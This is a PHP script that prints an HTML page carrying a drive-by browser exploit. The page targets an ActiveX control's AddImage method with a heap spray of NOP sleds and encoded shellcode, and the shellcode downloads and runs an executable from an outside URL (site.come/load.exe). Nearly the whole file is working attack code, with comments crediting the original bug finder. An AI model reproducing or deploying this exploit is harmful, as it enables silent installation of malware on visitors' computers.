&lt;?php

	// 0x48k-ymj by ...
	// based on /5043
	// Bug discovered by Krystian Kloskowski (h07) &lt;h07@interia.pl&gt;


	function unescape($s){
		$res=strtoupper(bin2hex($s));
		$g = round(strlen($res)/4);
		if ($g != (strlen($res)/4))$res.=&quot;00&quot;;
		$out = &quot;&quot;;
		for ($i=0; $i&lt;strlen($res);$i+=4)$out.=&quot;%u&quot;.substr($res, $i+2, 2).substr($res, $i, 2);
		return $out;
	}

	echo &#039;
		&lt;html&gt;
		&lt;body&gt;
		&lt;object id=&quot;obj&quot; classid=&quot;clsid:5F810AFC-BB5F-4416-BE63-E01DD117BD6C&quot;&gt;&lt;/object&gt;
		&lt;script language=&quot;JavaScript&quot;&gt;

			function gsc(){
				var hsta = 0x0c0c0c0c;
				var plc = unescape(&quot;%u4343%u4343&quot;+
				&quot;%u0feb%u335b%u66c9%u80b9%u8001%uef33&quot;+
				&quot;%ue243%uebfa%ue805%uffec%uffff%u8b7f&quot;+
				&quot;%udf4e%uefef%u64ef%ue3af%u9f64%u42f3&quot;+
				&quot;%u9f64%u6ee7%uef03%uefeb%u64ef%ub903&quot;+
				&quot;%u6187%ue1a1%u0703%uef11%uefef%uaa66&quot;+
				&quot;%ub9eb%u7787%u6511%u07e1%uef1f%uefef&quot;+
				&quot;%uaa66%ub9e7%uca87%u105f%u072d%uef0d&quot;+
				&quot;%uefef%uaa66%ub9e3%u0087%u0f21%u078f&quot;+
				&quot;%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96&quot;+
				&quot;%u0757%uef29%uefef%uaa66%uaffb%ud76f&quot;+
				&quot;%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef&quot;+
				&quot;%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba&quot;+
				&quot;%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0&quot;+
				&quot;%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c&quot;+
				&quot;%u66bf%ucfaa%u1087%uefef%ubfef%uaa64&quot;+
				&quot;%u85fb%ub6ed%uba64%u07f7%uef8e%uefef&quot;+
				&quot;%uaaec%u28cf%ub3ef%uc191%u288a%uebaf&quot;+
				&quot;%u8a97%uefef%u9a10%u64cf%ue3aa%uee85&quot;+
				&quot;%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8&quot;+
				&quot;%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf&quot;+
				&quot;%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc&quot;+
				&quot;%uefef%uef85%u9a10%u64cf%ue7aa%ued85&quot;+
				&quot;%u64b6%uf7ba%uff07%uefef%u85ef%u6410&quot;+
				&quot;%uffaa%uee85%u64b6%uf7ba%uef07%uefef&quot;+
				&quot;%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec&quot;+
				&quot;%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10&quot;+
				&quot;%u64ba%u6403%ue792%ub264%ub9e3%u9c64&quot;+
				&quot;%u64d3%uf19b%uec97%ub91c%u9964%ueccf&quot;+
				&quot;%udc1c%ua626%u42ae%u2cec%udcb9%ue019&quot;+
				&quot;%uff51%u1dd5%ue79b%u212e%uece2%uaf1d&quot;+
				&quot;%u1e04%u11d4%u9ab1%ub50a%u0464%ub564&quot;+
				&quot;%ueccb%u8932%ue364%u64a4%uf3b5%u32ec&quot;+
				&quot;%ueb64%uec64%ub12a%u2db2%uefe7%u1b07&quot;+
				&quot;%u1011%uba10%ua3bd%ua0a2%uefa1&quot;+
				&quot;&#039;.unescape(&quot;http://site.come/load.exe&quot;).&#039;&quot;);
				var hbs=0x400000;
				var pls=plc.length*2;
				var sss=hbs-(pls+0x38);
				var ss=unescape(&quot;%u0c0c%u0c0c&quot;);
				ss=gss(ss,sss);
				hbs=(hsta-0x400000)/hbs;
				for(i=0;i&lt;hbs;i++)m[i]=ss+plc;
			}
			function gss(ss,sss){
				while(ss.length&lt;sss*2)ss+=ss;
				ss=ss.substring(0,sss);
				return ss;
			}
			var m=new Array();
			gsc();
			try{
				var tmp=gss(unescape(&quot;%u0c0c%u0c0c&quot;),340);
				obj.AddImage(&quot;http://&quot;+tmp,1);
			}catch(e){}
		&lt;/script&gt;
		&lt;/body&gt;
		&lt;/html&gt;
	&#039;;

?&gt;
